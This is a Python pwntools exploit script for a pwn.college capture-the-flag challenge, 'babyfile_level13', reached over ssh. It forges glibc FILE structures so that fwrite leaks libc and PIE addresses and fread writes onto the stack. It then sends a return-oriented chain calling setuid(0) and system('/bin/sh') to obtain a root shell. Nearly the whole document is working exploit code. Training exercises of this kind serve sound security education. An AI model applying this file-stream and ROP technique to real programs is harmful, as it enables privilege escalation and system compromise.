from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level13")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
#b fwrite  if ( $rdi != stdout )
#b _IO_new_fclose if ( $rdi != stdout )
#b _IO_new_file_overflow if ( $rdi != stdout )
#b new_do_write if ( $rdi != stdout )
#b _IO_file_xsgetn if ( $rdi != stdin)
b *challenge+1685
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level13")
def new_note(which_: int,size: int):
    p.sendlineafter(b"[*] Commands: ",b"new_note")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.sendlineafter(b"How many bytes to the note?",str(size).encode())
def write_file(which_: int):
    p.sendlineafter(b"[*] Commands: ",b"write_file")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.recvuntil(f'fwrite(notes[{which_}], 1,'.encode())
    p.recvuntil(b'fp);\n')
def read_file(which_: int):
    p.sendlineafter(b"[*] Commands: ",b"read_file")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.recvuntil(f'fread(notes[{which_}], 1,'.encode())
    p.recvuntil(b'fp);\n')
p.recvuntil(b"[LEAK] The address of cmd where you are writing to is: 0x")
cmd_locate=int(p.recvuntil(b"\n").rstrip().decode(),16)
ret_addr=cmd_locate+0x98
new_note(0,200)
p.sendlineafter(b"[*] Commands: ",b"open_file")
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64(_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING)+ #_flags
            p64(0)+p64(0)+p64(0)+ # read_ptr,read_end,read_base
            p64(cmd_locate+0x68)+p64(cmd_locate+0x68+0x10)+p64(cmd_locate+0x68+0x11)+ # write_base,write_ptr,write_end
            p64(0)+p64(0)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(1)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)+p64(cmd_locate)+ # _lock
            b"\0"*(160-136-8)+p64(0)+ # _wide_data
            b"\0"*(216-160-8)
            )
write_file(0)
libc.address=int(p.recv(0x8)[::-1].hex(),16)-libc.sym.puts-378
log.info(f"libc @ {hex(libc.address)}")
e.address=int(p.recv(0x8)[::-1].hex(),16)-e.sym.__libc_csu_init
log.info(f"PIE @ {hex(e.address)}")
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64(0)+ #_flags
            p64(cmd_locate)+p64(cmd_locate+1)+p64(0)+ # read_ptr,read_end,read_base
            p64(0)+p64(0)+p64(0)+ # write_base,write_ptr,write_end
            p64(ret_addr)+p64(ret_addr+0x40)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(0)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)+p64(cmd_locate)+ # _lock
            b"\0"*(160-136-8)+p64(0)+ # _wide_data
            b"\0"*(216-160-8)
            )
new_note(1,2)
read_file(1)
sleep(1)
rdi_ret=libc.address+0x23b6a
p.sendline(
    p64(rdi_ret)+p64(0)+
    p64(libc.sym.setuid)+
    p64(rdi_ret)+p64(next(libc.search(b"/bin/sh")))+
    p64(libc.sym.system)
)
p.sendlineafter(b"[*] Commands: ",b"quit")
p.interactive()
